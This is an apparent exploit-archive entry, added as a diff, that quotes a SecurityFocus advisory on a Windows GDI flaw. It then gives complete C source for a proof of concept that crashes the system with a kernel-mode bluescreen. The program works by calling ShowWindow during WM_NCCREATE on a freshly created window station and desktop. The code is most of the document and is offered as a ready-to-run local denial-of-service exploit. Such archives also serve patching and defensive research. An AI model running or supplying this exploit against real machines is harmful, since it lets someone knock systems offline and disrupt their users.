@@ -1,0 +1,52 @@
+source: http://www.securityfocus.com/bid/3481/info
+
+The Windows Graphics Device Interface (GDI) is a set of Application Programming Interfaces (APIs) used to display graphical output.
+
+A vulnerability exists which causes the GDI to invoke a Kernel Mode Exception due to a memory access error. This action will result in a system stop error (bluescreen). A reboot of the system will allow normal system recovery.
+
+This condition may be due to an inability of the GDI API to handle requests with malformed or invalid arguments or flags.
+
+#include <windows.h>
+
+LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+        switch(message)
+        {
+        case WM_NCCREATE:
+                {
+                        ShowWindow(hwnd, SW_SHOW);
+                }
+                return TRUE;
+        }
+        return DefWindowProc(hwnd, message, wParam, lParam);
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+{
+        HWINSTA ws = CreateWindowStation(NULL, 0, WINSTA_CREATEDESKTOP | GENERIC_ALL, NULL);
+        SetProcessWindowStation(ws);
+        HDESK dt = CreateDesktop("TEST", 0, 0, 0, DESKTOP_CREATEWINDOW | GENERIC_ALL | DESKTOP_CREATEMENU | DESKTOP_SWITCHDESKTOP | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS, NULL); // no idea what access I actually need, I think this is just about everything
+        SetThreadDesktop(dt);
+        WNDCLASS wndclass = {0};
+        wndclass.style = CS_HREDRAW  | CS_VREDRAW;
+        wndclass.lpfnWndProc = WndProc;
+        wndclass.hInstance = hInstance;
+        wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); // default icon
+        wndclass.hCursor = LoadCursor(NULL, IDC_ARROW); // default cursor.  One or other (or both?) of these seem to be necessary.
+        wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
+        wndclass.lpszMenuName = NULL;
+        wndclass.lpszClassName = TEXT("Crash");
+        RegisterClass(&wndclass);
+        HWND hwnd = CreateWindowEx(WS_EX_TOOLWINDOW, TEXT("Crash"), TEXT("Crash"), WS_POPUP, 300, 300, 300, 445, NULL, NULL, hInstance, NULL);
+        // NEVER GETS HERE.
+        ShowWindow(hwnd, iCmdShow);
+        UpdateWindow(hwnd);
+        MSG msg;
+        while(GetMessage(&msg, NULL, 0, 0))
+        {
+                TranslateMessage(&msg);
+                DispatchMessage(&msg);
+        }
+        return msg.wParam;
+}
